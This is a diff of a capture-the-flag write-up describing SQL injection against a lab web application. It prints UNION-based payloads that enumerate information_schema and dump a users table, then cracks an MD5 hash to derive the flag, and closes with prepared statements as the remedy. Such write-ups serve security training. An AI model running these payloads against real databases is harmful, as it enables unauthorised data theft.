@@ -9,31 +9,29 @@ Error: "You have an error in your SQL syntax; check the manual that corresponds 
 From here on out we can genlty manipulate the database and ask it to give the name of the tables, databases and the type of database being used. And so through a set of commands we are not only able to determine the type of database but alson all the databases along with their tables and fields.
 
 ## Commands
-    1  AND 1 = SLEEP(2);--
+> 1  AND 1 = SLEEP(2);--
+> 1 UNION (SELECT 1,2 FROM dual );--
+> 1 UNION (SELECT TABLE_NAME, TABLE_SCHEMA  FROM information_schema.tables);--
+> 1 UNION (SELECT COLUMN_NAME, 1 FROM information_schema.columns );--
 
-    1 UNION (SELECT 1,2 FROM dual );--
+    ### One of these tables is users
+    Table : users
+    Colunm : user_id
+    Colunm : first_name
+    Colunm : last_name
+    Colunm : town
+    Colunm : country
+    Colunm : planet
+    Colunm : Commentaire
+    Colunm : countersign
+ * And through a number of these commands we are able to retrieve out flag   
+    ### Retrive flag
+    > 1 UNION (SELECT user_id, first_name FROM users);--
+    > 1 UNION (SELECT last_name, town FROM users);--
+    > 1 UNION (SELECT country, planet FROM users);--
+    > 1 UNION (SELECT Commentaire, countersign FROM users);--
 
-    1 UNION (SELECT TABLE_NAME, TABLE_SCHEMA  FROM information_schema.tables);--
 
-    1 UNION (SELECT COLUMN_NAME, 1 FROM information_schema.columns );--
-
-One of these tables is users
-Table : users
-Colunm : user_id
-Colunm : first_name
-Colunm : last_name
-Colunm : town
-Colunm : country
-Colunm : planet
-Colunm : Commentaire
-Colunm : countersign
-
-    1 UNION (SELECT user_id, first_name FROM users);--
-    1 UNION (SELECT last_name, town FROM users);--
-    1 UNION (SELECT country, planet FROM users);--
-    1 UNION (SELECT Commentaire, countersign FROM users);--
-
-And through a number of these commands we are able to retrieve out flag
 {
     instruction: Decrypt this password -> then lower all the char. Sh256 on it and it's good !   
     hash : 5ff9d0165b4f92b14994e5c685cdce28
@@ -42,7 +40,7 @@ And through a number of these commands we are able to retrieve out flag
 flag: 5ff9d0165b4f92b14994e5c685cdce28 -md5> fortytwo  -sha256> 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5 
 
 ## Remedy
-1. Now all of this  can be prevented by using prepared statements. Prepared statement will tell that database to look at the input as nothing else but just that, an input.
+* Now all of this  can be prevented by using prepared statements. Prepared statement will tell that database to look at the input as nothing else but just that, an input.
 
 # Resources
     https://www.youtube.com/watch?v=ciNHn38EyRc
